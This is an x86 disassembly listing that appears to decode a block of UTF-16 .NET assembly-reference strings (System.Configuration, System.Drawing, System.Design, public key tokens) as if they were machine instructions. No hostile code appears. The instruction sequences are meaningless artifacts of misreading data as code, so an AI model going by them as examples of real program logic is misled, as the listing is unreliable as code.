  40b5c9:	add    BYTE PTR [ebx],dh
  40b5cb:	add    BYTE PTR [ebx],dh
  40b5cd:	add    BYTE PTR [ebx],dh
  40b5cf:	add    BYTE PTR [ebx+0x0],al
  40b5d2:	xor    eax,0x45004500
  40b5d7:	add    BYTE PTR [esi],dh
  40b5d9:	add    BYTE PTR [eax],dh
  40b5db:	add    BYTE PTR [edx],dh
  40b5dd:	add    BYTE PTR [ecx],dh
  40b5df:	add    BYTE PTR [esi],dh
  40b5e1:	add    BYTE PTR [edi],dh
  40b5e3:	add    BYTE PTR [edx],dh
  40b5e5:	add    BYTE PTR [eax+eax*1+0x39],al
  40b5e9:	add    BYTE PTR [edi],dh
  40b5eb:	add    BYTE PTR [ecx],dh
  40b5ed:	add    BYTE PTR [eax],bh
  40b5ef:	add    BYTE PTR [ebp+0x0],al
  40b5f2:	inc    ecx
  40b5f3:	add    BYTE PTR [ebx],dh
  40b5f5:	add    BYTE PTR [ecx],dh
  40b5f7:	add    BYTE PTR [ecx+0x0],al
  40b5fa:	cmp    BYTE PTR [eax],al
  40b5fc:	inc    ecx
  40b5fd:	add    BYTE PTR [ebp+0x0],al
  40b600:	inc    edx
  40b601:	add    BYTE PTR [eax+eax*1+0x30],al
  40b605:	add    BYTE PTR [eax+eax*1+0x41],al
  40b609:	add    BYTE PTR [eax],dh
  40b60b:	add    BYTE PTR [eax],dh
  40b60d:	add    BYTE PTR [edi],dh
  40b60f:	add    BYTE PTR [edx],dh
  40b611:	add    BYTE PTR [esi+0x0],al
  40b614:	xor    al,BYTE PTR [eax]
  40b616:	xor    eax,0x38004400
  40b61b:	add    BYTE PTR [edi],dh
  40b61d:	add    BYTE PTR [eax+eax*1+0x42],al
  40b621:	add    BYTE PTR [ecx+0x0],al
  40b624:	add    BYTE PTR ss:[esi+0x0],al
  40b628:	inc    ebx
  40b629:	add    BYTE PTR [ecx],bh
  40b62b:	add    BYTE PTR [eax],dh
  40b62d:	add    BYTE PTR [esi+0x0],al
  40b630:	inc    esi
  40b631:	add    BYTE PTR [eax+eax*1+0x35],al
  40b635:	add    BYTE PTR [ecx],bh
  40b637:	add    BYTE PTR [eax],bh
  40b639:	add    BYTE PTR [ebp+0x0],al
  40b63c:	inc    esp
  40b63d:	add    BYTE PTR [eax+eax*1],dh
  40b640:	inc    esp
  40b641:	add    BYTE PTR [ecx+0x0],al
  40b644:	xor    eax,DWORD PTR [eax]
  40b646:	xor    eax,0x34004500
  40b64b:	add    BYTE PTR [eax+eax*1],dh
  40b64e:	inc    ebx
  40b64f:	add    BYTE PTR [ebx],dh
  40b651:	add    BYTE PTR [ecx],bh
  40b653:	add    BYTE PTR [eax],bh
  40b655:	add    BYTE PTR [ebx+0x0],al
  40b658:	xor    al,0x0
  40b65a:	xor    eax,0x33003400
  40b65f:	add    BYTE PTR [eax],dh
  40b661:	add    BYTE PTR [edi],dh
  40b663:	add    BYTE PTR [ebp+0x0],al
  40b666:	cmp    BYTE PTR [eax],al
  40b668:	inc    ebp
  40b669:	add    BYTE PTR [ebx],dh
  40b66b:	add    BYTE PTR [ebx],dh
  40b66d:	add    BYTE PTR [edx+0x0],al
  40b670:	cmp    BYTE PTR [eax],al
  40b672:	xor    al,0x0
  40b674:	xor    al,BYTE PTR [eax]
  40b676:	add    BYTE PTR ss:[ecx],dh
  40b679:	add    BYTE PTR [eax+eax*1],dh
  40b67c:	xor    eax,DWORD PTR [eax]
  40b67e:	inc    esp
  40b67f:	add    BYTE PTR [ecx+0x0],al
  40b682:	inc    ebp
  40b683:	add    BYTE PTR [ebx+0x0],al
  40b686:	cmp    DWORD PTR [eax],eax
  40b688:	inc    esi
  40b689:	add    BYTE PTR ds:0x36003900,dh
  40b68f:	add    BYTE PTR [eax],bh
  40b691:	add    BYTE PTR [ebx],dh
  40b693:	add    BYTE PTR [esi],dh
  40b695:	add    BYTE PTR [esi+0x0],al
  40b698:	cmp    DWORD PTR [eax],eax
  40b69a:	aaa    
  40b69b:	add    BYTE PTR [ebx+0x0],al
  40b69e:	cmp    BYTE PTR [eax],al
  40b6a0:	inc    esi
  40b6a1:	add    BYTE PTR [edi],dh
  40b6a3:	add    BYTE PTR [eax+eax*1],dh
  40b6a6:	aaa    
  40b6a7:	add    BYTE PTR ds:0x45003000,dh
  40b6ad:	add    BYTE PTR ds:0x37003900,dh
  40b6b3:	add    BYTE PTR ds:0x36004300,dh
  40b6b9:	add    BYTE PTR [eax+eax*1],dh
  40b6bc:	inc    ebp
  40b6bd:	add    BYTE PTR [edx],dh
  40b6bf:	add    BYTE PTR [ecx],dh
  40b6c1:	add    BYTE PTR [eax],bh
  40b6c3:	add    BYTE PTR [ecx],bh
  40b6c5:	add    BYTE PTR [esi+0x0],al
  40b6c8:	xor    al,0x0
  40b6ca:	xor    eax,0x45004400
  40b6cf:	add    BYTE PTR [esi+0x0],al
  40b6d2:	xor    al,0x0
  40b6d4:	add    BYTE PTR ss:[edx+0x0],al
  40b6d8:	xor    al,BYTE PTR [eax]
  40b6da:	inc    ecx
  40b6db:	add    BYTE PTR [edx],dh
  40b6dd:	add    BYTE PTR [edx+0x0],al
  40b6e0:	xor    DWORD PTR [eax],eax
  40b6e2:	xor    al,BYTE PTR [eax]
  40b6e4:	xor    al,0x0
  40b6e6:	aaa    
  40b6e7:	add    BYTE PTR [ecx+0x0],al
  40b6ea:	inc    esp
  40b6eb:	add    BYTE PTR [ebx+0x0],al
  40b6ee:	xor    eax,DWORD PTR [eax]
  40b6f0:	add    BYTE PTR ss:0x42003200,dh
  40b6f7:	add    BYTE PTR [esi+0x0],al
  40b6fa:	xor    eax,0x33004300
  40b6ff:	add    BYTE PTR [eax],dh
  40b701:	add    BYTE PTR [eax],bh
  40b703:	add    BYTE PTR [eax],dh
  40b705:	add    BYTE PTR ds:0x44003500,dh
  40b70b:	add    BYTE PTR [ecx+0x0],al
  40b70e:	cmp    DWORD PTR [eax],eax
  40b710:	adc    al,0x53
  40b713:	add    BYTE PTR [ecx+0x0],bh
  40b716:	jae    0x40b718
  40b718:	je     0x40b71a
  40b71a:	add    BYTE PTR gs:[ebp+0x0],ch
  40b71e:	add    BYTE PTR cs:[ebx+0x0],al
  40b722:	outs   dx,DWORD PTR ds:[esi]
  40b723:	add    BYTE PTR [ebp+0x0],ch
  40b726:	jo     0x40b728
  40b728:	outs   dx,DWORD PTR ds:[esi]
  40b729:	add    BYTE PTR [esi+0x0],ch
  40b72c:	add    BYTE PTR gs:[esi+0x0],ch
  40b730:	je     0x40b732
  40b732:	dec    ebp
  40b733:	add    BYTE PTR [edi+0x0],ch
  40b736:	add    BYTE PTR fs:[ebp+0x0],ah
  40b73a:	ins    BYTE PTR es:[edi],dx
  40b73b:	add    BYTE PTR [esi],ch
  40b73d:	add    BYTE PTR [eax+eax*1+0x61],al
  40b741:	add    BYTE PTR [eax+eax*1+0x61],dh
  40b745:	add    BYTE PTR [ecx+0x0],al
  40b748:	outs   dx,BYTE PTR ds:[esi]
  40b749:	add    BYTE PTR [esi+0x0],ch
  40b74c:	outs   dx,DWORD PTR ds:[esi]
  40b74d:	add    BYTE PTR [eax+eax*1+0x61],dh
  40b751:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b755:	add    BYTE PTR [edi+0x0],ch
  40b758:	outs   dx,BYTE PTR ds:[esi]
  40b759:	add    BYTE PTR [ebx+0x0],dh
  40b75c:	sub    al,0x0
  40b75e:	and    BYTE PTR [eax],al
  40b760:	push   esi
  40b761:	add    BYTE PTR [ebp+0x0],ah
  40b764:	jb     0x40b766
  40b766:	jae    0x40b768
  40b768:	imul   eax,DWORD PTR [eax],0x6e006f
  40b76e:	cmp    eax,0x2e003300
  40b773:	add    BYTE PTR ds:0x30002e00,dh
  40b779:	add    BYTE PTR [esi],ch
  40b77b:	add    BYTE PTR [eax],dh
  40b77d:	add    BYTE PTR [eax+eax*1],ch
  40b780:	and    BYTE PTR [eax],al
  40b782:	inc    ebx
  40b783:	add    BYTE PTR [ebp+0x0],dh
  40b786:	ins    BYTE PTR es:[edi],dx
  40b787:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b78b:	add    BYTE PTR [edx+0x0],dh
  40b78e:	add    BYTE PTR gs:0x65006e00,bh
  40b795:	add    BYTE PTR [ebp+0x0],dh
  40b798:	je     0x40b79a
  40b79a:	jb     0x40b79c
  40b79c:	popa   
  40b79d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b7a1:	add    BYTE PTR [eax],ah
  40b7a3:	add    BYTE PTR [eax+0x0],dl
  40b7a6:	jne    0x40b7a8
  40b7a8:	bound  eax,QWORD PTR [eax]
  40b7aa:	ins    BYTE PTR es:[edi],dx
  40b7ab:	add    BYTE PTR [ecx+0x0],ch
  40b7ae:	arpl   WORD PTR [eax],ax
  40b7b0:	dec    ebx
  40b7b1:	add    BYTE PTR [ebp+0x0],ah
  40b7b4:	jns    0x40b7b6
  40b7b6:	push   esp
  40b7b7:	add    BYTE PTR [edi+0x0],ch
  40b7ba:	imul   eax,DWORD PTR [eax],0x65
  40b7bd:	add    BYTE PTR [esi+0x0],ch
  40b7c0:	cmp    eax,0x31003300
  40b7c5:	add    BYTE PTR [edx+0x0],ah
  40b7c8:	data16 add BYTE PTR [ebx],dh
  40b7cb:	add    BYTE PTR [eax],bh
  40b7cd:	add    BYTE PTR ds:0x61003600,dh
  40b7d3:	add    BYTE PTR [eax+eax*1+0x33],ah
  40b7d7:	add    BYTE PTR [esi],dh
  40b7d9:	add    BYTE PTR [eax+eax*1],dh
  40b7dc:	add    BYTE PTR gs:[ebx],dh
  40b7df:	add    BYTE PTR ds:0x53ae8000,dh
  40b7e5:	add    BYTE PTR [ecx+0x0],bh
  40b7e8:	jae    0x40b7ea
  40b7ea:	je     0x40b7ec
  40b7ec:	add    BYTE PTR gs:[ebp+0x0],ch
  40b7f0:	add    BYTE PTR cs:[ebx+0x0],al
  40b7f4:	outs   dx,DWORD PTR ds:[esi]
  40b7f5:	add    BYTE PTR [esi+0x0],ch
  40b7f8:	data16 add BYTE PTR [ecx+0x0],ch
  40b7fc:	add    BYTE PTR [di+0x0],dh
  40b800:	jb     0x40b802
  40b802:	popa   
  40b803:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b807:	add    BYTE PTR [edi+0x0],ch
  40b80a:	outs   dx,BYTE PTR ds:[esi]
  40b80b:	add    BYTE PTR [eax+eax*1],ch
  40b80e:	and    BYTE PTR [eax],al
  40b810:	push   esi
  40b811:	add    BYTE PTR [ebp+0x0],ah
  40b814:	jb     0x40b816
  40b816:	jae    0x40b818
  40b818:	imul   eax,DWORD PTR [eax],0x6e006f
  40b81e:	cmp    eax,0x2e003200
  40b823:	add    BYTE PTR [eax],dh
  40b825:	add    BYTE PTR [esi],ch
  40b827:	add    BYTE PTR [eax],dh
  40b829:	add    BYTE PTR [esi],ch
  40b82b:	add    BYTE PTR [eax],dh
  40b82d:	add    BYTE PTR [eax+eax*1],ch
  40b830:	and    BYTE PTR [eax],al
  40b832:	inc    ebx
  40b833:	add    BYTE PTR [ebp+0x0],dh
  40b836:	ins    BYTE PTR es:[edi],dx
  40b837:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b83b:	add    BYTE PTR [edx+0x0],dh
  40b83e:	add    BYTE PTR gs:0x65006e00,bh
  40b845:	add    BYTE PTR [ebp+0x0],dh
  40b848:	je     0x40b84a
  40b84a:	jb     0x40b84c
  40b84c:	popa   
  40b84d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b851:	add    BYTE PTR [eax],ah
  40b853:	add    BYTE PTR [eax+0x0],dl
  40b856:	jne    0x40b858
  40b858:	bound  eax,QWORD PTR [eax]
  40b85a:	ins    BYTE PTR es:[edi],dx
  40b85b:	add    BYTE PTR [ecx+0x0],ch
  40b85e:	arpl   WORD PTR [eax],ax
  40b860:	dec    ebx
  40b861:	add    BYTE PTR [ebp+0x0],ah
  40b864:	jns    0x40b866
  40b866:	push   esp
  40b867:	add    BYTE PTR [edi+0x0],ch
  40b86a:	imul   eax,DWORD PTR [eax],0x65
  40b86d:	add    BYTE PTR [esi+0x0],ch
  40b870:	cmp    eax,0x30006200
  40b875:	add    BYTE PTR [ebx],dh
  40b877:	add    BYTE PTR [esi+0x0],ah
  40b87a:	xor    eax,0x37006600
  40b87f:	add    BYTE PTR [esi+0x0],ah
  40b882:	xor    DWORD PTR [eax],eax
  40b884:	xor    DWORD PTR [eax],eax
  40b886:	add    BYTE PTR fs:0x61003000,dh
  40b88d:	add    BYTE PTR [ebx],dh
  40b88f:	add    BYTE PTR [ecx+0x0],ah
  40b892:	cmp    BYTE PTR [esi+0x790053],0x73
  40b899:	add    BYTE PTR [eax+eax*1+0x65],dh
  40b89d:	add    BYTE PTR [ebp+0x0],ch
  40b8a0:	add    BYTE PTR cs:[ebx+0x0],al
  40b8a4:	outs   dx,DWORD PTR ds:[esi]
  40b8a5:	add    BYTE PTR [esi+0x0],ch
  40b8a8:	data16 add BYTE PTR [ecx+0x0],ch
  40b8ac:	add    BYTE PTR [di+0x0],dh
  40b8b0:	jb     0x40b8b2
  40b8b2:	popa   
  40b8b3:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b8b7:	add    BYTE PTR [edi+0x0],ch
  40b8ba:	outs   dx,BYTE PTR ds:[esi]
  40b8bb:	add    BYTE PTR [esi],ch
  40b8bd:	add    BYTE PTR [ecx+0x0],cl
  40b8c0:	outs   dx,BYTE PTR ds:[esi]
  40b8c1:	add    BYTE PTR [ebx+0x0],dh
  40b8c4:	je     0x40b8c6
  40b8c6:	popa   
  40b8c7:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40b8cb:	add    BYTE PTR [eax+eax*1],ch
  40b8ce:	and    BYTE PTR [eax],al
  40b8d0:	push   esi
  40b8d1:	add    BYTE PTR [ebp+0x0],ah
  40b8d4:	jb     0x40b8d6
  40b8d6:	jae    0x40b8d8
  40b8d8:	imul   eax,DWORD PTR [eax],0x6e006f
  40b8de:	cmp    eax,0x2e003200
  40b8e3:	add    BYTE PTR [eax],dh
  40b8e5:	add    BYTE PTR [esi],ch
  40b8e7:	add    BYTE PTR [eax],dh
  40b8e9:	add    BYTE PTR [esi],ch
  40b8eb:	add    BYTE PTR [eax],dh
  40b8ed:	add    BYTE PTR [eax+eax*1],ch
  40b8f0:	and    BYTE PTR [eax],al
  40b8f2:	inc    ebx
  40b8f3:	add    BYTE PTR [ebp+0x0],dh
  40b8f6:	ins    BYTE PTR es:[edi],dx
  40b8f7:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b8fb:	add    BYTE PTR [edx+0x0],dh
  40b8fe:	add    BYTE PTR gs:0x65006e00,bh
  40b905:	add    BYTE PTR [ebp+0x0],dh
  40b908:	je     0x40b90a
  40b90a:	jb     0x40b90c
  40b90c:	popa   
  40b90d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b911:	add    BYTE PTR [eax],ah
  40b913:	add    BYTE PTR [eax+0x0],dl
  40b916:	jne    0x40b918
  40b918:	bound  eax,QWORD PTR [eax]
  40b91a:	ins    BYTE PTR es:[edi],dx
  40b91b:	add    BYTE PTR [ecx+0x0],ch
  40b91e:	arpl   WORD PTR [eax],ax
  40b920:	dec    ebx
  40b921:	add    BYTE PTR [ebp+0x0],ah
  40b924:	jns    0x40b926
  40b926:	push   esp
  40b927:	add    BYTE PTR [edi+0x0],ch
  40b92a:	imul   eax,DWORD PTR [eax],0x65
  40b92d:	add    BYTE PTR [esi+0x0],ch
  40b930:	cmp    eax,0x30006200
  40b935:	add    BYTE PTR [ebx],dh
  40b937:	add    BYTE PTR [esi+0x0],ah
  40b93a:	xor    eax,0x37006600
  40b93f:	add    BYTE PTR [esi+0x0],ah
  40b942:	xor    DWORD PTR [eax],eax
  40b944:	xor    DWORD PTR [eax],eax
  40b946:	add    BYTE PTR fs:0x61003000,dh
  40b94d:	add    BYTE PTR [ebx],dh
  40b94f:	add    BYTE PTR [ecx+0x0],ah
  40b952:	sub    BYTE PTR [eax+0x790053],0x73
  40b959:	add    BYTE PTR [eax+eax*1+0x65],dh
  40b95d:	add    BYTE PTR [ebp+0x0],ch
  40b960:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40b965:	add    BYTE PTR [eax+0x0],dh
  40b968:	ins    BYTE PTR es:[edi],dx
  40b969:	add    BYTE PTR [edi+0x0],ch
  40b96c:	jns    0x40b96e
  40b96e:	ins    DWORD PTR es:[edi],dx
  40b96f:	add    BYTE PTR [ebp+0x0],ah
  40b972:	outs   dx,BYTE PTR ds:[esi]
  40b973:	add    BYTE PTR [eax+eax*1+0x2c],dh
  40b977:	add    BYTE PTR [eax],ah
  40b979:	add    BYTE PTR [esi+0x0],dl
  40b97c:	add    BYTE PTR gs:[edx+0x0],dh
  40b980:	jae    0x40b982
  40b982:	imul   eax,DWORD PTR [eax],0x6e006f
  40b988:	cmp    eax,0x2e003200
  40b98d:	add    BYTE PTR [eax],dh
  40b98f:	add    BYTE PTR [esi],ch
  40b991:	add    BYTE PTR [eax],dh
  40b993:	add    BYTE PTR [esi],ch
  40b995:	add    BYTE PTR [eax],dh
  40b997:	add    BYTE PTR [eax+eax*1],ch
  40b99a:	and    BYTE PTR [eax],al
  40b99c:	inc    ebx
  40b99d:	add    BYTE PTR [ebp+0x0],dh
  40b9a0:	ins    BYTE PTR es:[edi],dx
  40b9a1:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b9a5:	add    BYTE PTR [edx+0x0],dh
  40b9a8:	add    BYTE PTR gs:0x65006e00,bh
  40b9af:	add    BYTE PTR [ebp+0x0],dh
  40b9b2:	je     0x40b9b4
  40b9b4:	jb     0x40b9b6
  40b9b6:	popa   
  40b9b7:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b9bb:	add    BYTE PTR [eax],ah
  40b9bd:	add    BYTE PTR [eax+0x0],dl
  40b9c0:	jne    0x40b9c2
  40b9c2:	bound  eax,QWORD PTR [eax]
  40b9c4:	ins    BYTE PTR es:[edi],dx
  40b9c5:	add    BYTE PTR [ecx+0x0],ch
  40b9c8:	arpl   WORD PTR [eax],ax
  40b9ca:	dec    ebx
  40b9cb:	add    BYTE PTR [ebp+0x0],ah
  40b9ce:	jns    0x40b9d0
  40b9d0:	push   esp
  40b9d1:	add    BYTE PTR [edi+0x0],ch
  40b9d4:	imul   eax,DWORD PTR [eax],0x65
  40b9d7:	add    BYTE PTR [esi+0x0],ch
  40b9da:	cmp    eax,0x30006200
  40b9df:	add    BYTE PTR [ebx],dh
  40b9e1:	add    BYTE PTR [esi+0x0],ah
  40b9e4:	xor    eax,0x37006600
  40b9e9:	add    BYTE PTR [esi+0x0],ah
  40b9ec:	xor    DWORD PTR [eax],eax
  40b9ee:	xor    DWORD PTR [eax],eax
  40b9f0:	add    BYTE PTR fs:0x61003000,dh
  40b9f7:	add    BYTE PTR [ebx],dh
  40b9f9:	add    BYTE PTR [ecx+0x0],ah
  40b9fc:	and    BYTE PTR [eax+0x790053],0x73
  40ba03:	add    BYTE PTR [eax+eax*1+0x65],dh
  40ba07:	add    BYTE PTR [ebp+0x0],ch
  40ba0a:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40ba0f:	add    BYTE PTR [ebx+0x0],dh
  40ba12:	imul   eax,DWORD PTR [eax],0x6e0067
  40ba18:	sub    al,0x0
  40ba1a:	and    BYTE PTR [eax],al
  40ba1c:	push   esi
  40ba1d:	add    BYTE PTR [ebp+0x0],ah
  40ba20:	jb     0x40ba22
  40ba22:	jae    0x40ba24
  40ba24:	imul   eax,DWORD PTR [eax],0x6e006f
  40ba2a:	cmp    eax,0x2e003200
  40ba2f:	add    BYTE PTR [eax],dh
  40ba31:	add    BYTE PTR [esi],ch
  40ba33:	add    BYTE PTR [eax],dh
  40ba35:	add    BYTE PTR [esi],ch
  40ba37:	add    BYTE PTR [eax],dh
  40ba39:	add    BYTE PTR [eax+eax*1],ch
  40ba3c:	and    BYTE PTR [eax],al
  40ba3e:	inc    ebx
  40ba3f:	add    BYTE PTR [ebp+0x0],dh
  40ba42:	ins    BYTE PTR es:[edi],dx
  40ba43:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ba47:	add    BYTE PTR [edx+0x0],dh
  40ba4a:	add    BYTE PTR gs:0x65006e00,bh
  40ba51:	add    BYTE PTR [ebp+0x0],dh
  40ba54:	je     0x40ba56
  40ba56:	jb     0x40ba58
  40ba58:	popa   
  40ba59:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ba5d:	add    BYTE PTR [eax],ah
  40ba5f:	add    BYTE PTR [eax+0x0],dl
  40ba62:	jne    0x40ba64
  40ba64:	bound  eax,QWORD PTR [eax]
  40ba66:	ins    BYTE PTR es:[edi],dx
  40ba67:	add    BYTE PTR [ecx+0x0],ch
  40ba6a:	arpl   WORD PTR [eax],ax
  40ba6c:	dec    ebx
  40ba6d:	add    BYTE PTR [ebp+0x0],ah
  40ba70:	jns    0x40ba72
  40ba72:	push   esp
  40ba73:	add    BYTE PTR [edi+0x0],ch
  40ba76:	imul   eax,DWORD PTR [eax],0x65
  40ba79:	add    BYTE PTR [esi+0x0],ch
  40ba7c:	cmp    eax,0x30006200
  40ba81:	add    BYTE PTR [ebx],dh
  40ba83:	add    BYTE PTR [esi+0x0],ah
  40ba86:	xor    eax,0x37006600
  40ba8b:	add    BYTE PTR [esi+0x0],ah
  40ba8e:	xor    DWORD PTR [eax],eax
  40ba90:	xor    DWORD PTR [eax],eax
  40ba92:	add    BYTE PTR fs:0x61003000,dh
  40ba99:	add    BYTE PTR [ebx],dh
  40ba9b:	add    BYTE PTR [ecx+0x0],ah
  40ba9e:	xor    BYTE PTR [esi+0x790053],0x73
  40baa5:	add    BYTE PTR [eax+eax*1+0x65],dh
  40baa9:	add    BYTE PTR [ebp+0x0],ch
  40baac:	add    BYTE PTR cs:[eax+eax*1+0x69],al
  40bab1:	add    BYTE PTR [edx+0x0],dh
  40bab4:	add    BYTE PTR gs:[ebx+0x0],ah
  40bab8:	je     0x40baba
  40baba:	outs   dx,DWORD PTR ds:[esi]
  40babb:	add    BYTE PTR [edx+0x0],dh
  40babe:	jns    0x40bac0
  40bac0:	push   ebx
  40bac1:	add    BYTE PTR [ebp+0x0],ah
  40bac4:	jb     0x40bac6
  40bac6:	jbe    0x40bac8
  40bac8:	imul   eax,DWORD PTR [eax],0x650063
  40bace:	jae    0x40bad0
  40bad0:	sub    al,0x0
  40bad2:	and    BYTE PTR [eax],al
  40bad4:	push   esi
  40bad5:	add    BYTE PTR [ebp+0x0],ah
  40bad8:	jb     0x40bada
  40bada:	jae    0x40badc
  40badc:	imul   eax,DWORD PTR [eax],0x6e006f
  40bae2:	cmp    eax,0x2e003200
  40bae7:	add    BYTE PTR [eax],dh
  40bae9:	add    BYTE PTR [esi],ch
  40baeb:	add    BYTE PTR [eax],dh
  40baed:	add    BYTE PTR [esi],ch
  40baef:	add    BYTE PTR [eax],dh
  40baf1:	add    BYTE PTR [eax+eax*1],ch
  40baf4:	and    BYTE PTR [eax],al
  40baf6:	inc    ebx
  40baf7:	add    BYTE PTR [ebp+0x0],dh
  40bafa:	ins    BYTE PTR es:[edi],dx
  40bafb:	add    BYTE PTR [eax+eax*1+0x75],dh
  40baff:	add    BYTE PTR [edx+0x0],dh
  40bb02:	add    BYTE PTR gs:0x65006e00,bh
  40bb09:	add    BYTE PTR [ebp+0x0],dh
  40bb0c:	je     0x40bb0e
  40bb0e:	jb     0x40bb10
  40bb10:	popa   
  40bb11:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40bb15:	add    BYTE PTR [eax],ah
  40bb17:	add    BYTE PTR [eax+0x0],dl
  40bb1a:	jne    0x40bb1c
  40bb1c:	bound  eax,QWORD PTR [eax]
  40bb1e:	ins    BYTE PTR es:[edi],dx
  40bb1f:	add    BYTE PTR [ecx+0x0],ch
  40bb22:	arpl   WORD PTR [eax],ax
  40bb24:	dec    ebx
  40bb25:	add    BYTE PTR [ebp+0x0],ah
  40bb28:	jns    0x40bb2a
  40bb2a:	push   esp
  40bb2b:	add    BYTE PTR [edi+0x0],ch
  40bb2e:	imul   eax,DWORD PTR [eax],0x65
  40bb31:	add    BYTE PTR [esi+0x0],ch
  40bb34:	cmp    eax,0x30006200
  40bb39:	add    BYTE PTR [ebx],dh
  40bb3b:	add    BYTE PTR [esi+0x0],ah
  40bb3e:	xor    eax,0x37006600
  40bb43:	add    BYTE PTR [esi+0x0],ah
  40bb46:	xor    DWORD PTR [eax],eax
  40bb48:	xor    DWORD PTR [eax],eax
  40bb4a:	add    BYTE PTR fs:0x61003000,dh
  40bb51:	add    BYTE PTR [ebx],dh
  40bb53:	add    BYTE PTR [ecx+0x0],ah
  40bb56:	xor    BYTE PTR [eax+0x790053],0x73
  40bb5d:	add    BYTE PTR [eax+eax*1+0x65],dh
  40bb61:	add    BYTE PTR [ebp+0x0],ch
  40bb64:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  40bb69:	add    BYTE PTR [ecx+0x0],ah
  40bb6c:	ja     0x40bb6e
  40bb6e:	imul   eax,DWORD PTR [eax],0x67006e
  40bb74:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40bb79:	add    BYTE PTR [ebx+0x0],dh
  40bb7c:	imul   eax,DWORD PTR [eax],0x6e0067
  40bb82:	sub    al,0x0
  40bb84:	and    BYTE PTR [eax],al
  40bb86:	push   esi
  40bb87:	add    BYTE PTR [ebp+0x0],ah
  40bb8a:	jb     0x40bb8c
  40bb8c:	jae    0x40bb8e
  40bb8e:	imul   eax,DWORD PTR [eax],0x6e006f
  40bb94:	cmp    eax,0x2e003200
  40bb99:	add    BYTE PTR [eax],dh
  40bb9b:	add    BYTE PTR [esi],ch
  40bb9d:	add    BYTE PTR [eax],dh
  40bb9f:	add    BYTE PTR [esi],ch
  40bba1:	add    BYTE PTR [eax],dh
  40bba3:	add    BYTE PTR [eax+eax*1],ch
  40bba6:	and    BYTE PTR [eax],al
  40bba8:	inc    ebx
  40bba9:	add    BYTE PTR [ebp+0x0],dh
  40bbac:	ins    BYTE PTR es:[edi],dx
  40bbad:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bbb1:	add    BYTE PTR [edx+0x0],dh
  40bbb4:	add    BYTE PTR gs:0x65006e00,bh
  40bbbb:	add    BYTE PTR [ebp+0x0],dh
  40bbbe:	je     0x40bbc0
  40bbc0:	jb     0x40bbc2
  40bbc2:	popa   
  40bbc3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40bbc7:	add    BYTE PTR [eax],ah
  40bbc9:	add    BYTE PTR [eax+0x0],dl
  40bbcc:	jne    0x40bbce
  40bbce:	bound  eax,QWORD PTR [eax]
  40bbd0:	ins    BYTE PTR es:[edi],dx
  40bbd1:	add    BYTE PTR [ecx+0x0],ch
  40bbd4:	arpl   WORD PTR [eax],ax
  40bbd6:	dec    ebx
  40bbd7:	add    BYTE PTR [ebp+0x0],ah
  40bbda:	jns    0x40bbdc
  40bbdc:	push   esp
  40bbdd:	add    BYTE PTR [edi+0x0],ch
  40bbe0:	imul   eax,DWORD PTR [eax],0x65
  40bbe3:	add    BYTE PTR [esi+0x0],ch
  40bbe6:	cmp    eax,0x30006200
  40bbeb:	add    BYTE PTR [ebx],dh
  40bbed:	add    BYTE PTR [esi+0x0],ah
  40bbf0:	xor    eax,0x37006600
  40bbf5:	add    BYTE PTR [esi+0x0],ah
  40bbf8:	xor    DWORD PTR [eax],eax
  40bbfa:	xor    DWORD PTR [eax],eax
  40bbfc:	add    BYTE PTR fs:0x61003000,dh
  40bc03:	add    BYTE PTR [ebx],dh
  40bc05:	add    BYTE PTR [ecx+0x0],ah
  40bc08:	and    BYTE PTR [edx+0x790053],0x73
  40bc0f:	add    BYTE PTR [eax+eax*1+0x65],dh
  40bc13:	add    BYTE PTR [ebp+0x0],ch
  40bc16:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  40bc1b:	add    BYTE PTR [ecx+0x0],ah
  40bc1e:	ja     0x40bc20
  40bc20:	imul   eax,DWORD PTR [eax],0x67006e
  40bc26:	sub    al,0x0
  40bc28:	and    BYTE PTR [eax],al
  40bc2a:	push   esi
  40bc2b:	add    BYTE PTR [ebp+0x0],ah
  40bc2e:	jb     0x40bc30
  40bc30:	jae    0x40bc32
  40bc32:	imul   eax,DWORD PTR [eax],0x6e006f
  40bc38:	cmp    eax,0x2e003200
  40bc3d:	add    BYTE PTR [eax],dh
  40bc3f:	add    BYTE PTR [esi],ch
  40bc41:	add    BYTE PTR [eax],dh
  40bc43:	add    BYTE PTR [esi],ch
  40bc45:	add    BYTE PTR [eax],dh
  40bc47:	add    BYTE PTR [eax+eax*1],ch
  40bc4a:	and    BYTE PTR [eax],al
  40bc4c:	inc    ebx
  40bc4d:	add    BYTE PTR [ebp+0x0],dh
  40bc50:	ins    BYTE PTR es:[edi],dx
  40bc51:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bc55:	add    BYTE PTR [edx+0x0],dh
  40bc58:	add    BYTE PTR gs:0x65006e00,bh
  40bc5f:	add    BYTE PTR [ebp+0x0],dh
  40bc62:	je     0x40bc64
  40bc64:	jb     0x40bc66
  40bc66:	popa   
  40bc67:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40bc6b:	add    BYTE PTR [eax],ah
  40bc6d:	add    BYTE PTR [eax+0x0],dl
  40bc70:	jne    0x40bc72
  40bc72:	bound  eax,QWORD PTR [eax]
  40bc74:	ins    BYTE PTR es:[edi],dx
  40bc75:	add    BYTE PTR [ecx+0x0],ch
  40bc78:	arpl   WORD PTR [eax],ax
  40bc7a:	dec    ebx
  40bc7b:	add    BYTE PTR [ebp+0x0],ah
  40bc7e:	jns    0x40bc80
